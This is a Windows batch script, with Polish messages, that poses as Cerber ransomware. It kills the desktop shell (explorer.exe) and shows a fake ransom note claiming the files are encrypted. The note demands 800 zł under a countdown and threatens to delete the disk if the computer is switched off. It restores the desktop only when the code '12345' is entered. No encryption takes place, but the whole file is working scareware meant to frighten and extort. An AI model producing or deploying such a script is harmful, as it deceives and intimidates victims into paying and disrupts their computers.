@echo off
title Cerber Ransmoware.bat
echo Ten plik to trojan!!!, moze wyrzondzic szkody!
pause
taskkill /f /im explorer.exe
cls
echo Twe pliki i ich dane zostaly zaszyfrowane z twym pc zeby je dostac musisz kupic aplikacje Cerber Descrypt WWW36366CerberRansmowar-help//4839491229.org
echo Zaplac 800zl czasu masz 3dzni 5godz 54min 39sek jak czas minie twe pc zostanie zablokowane na zawsze:( 
echo Nie wylonczaj komputera jak go wylonczysz twuj dysk zostanie usunienty lub komputer zostanie ususnienty
echo Pospiesz sie!
set code=""

:code
set /p code="Wpisz kod:"
if "%code%"=="12345" goto correct
if NOT "%code%"=="12345" goto wrong

:correct
start explorer
echo Kod jest dobry!
pause
exit

:wrong
echo Kod nieprawidlowy chyba nie zaplaciles:(
goto code
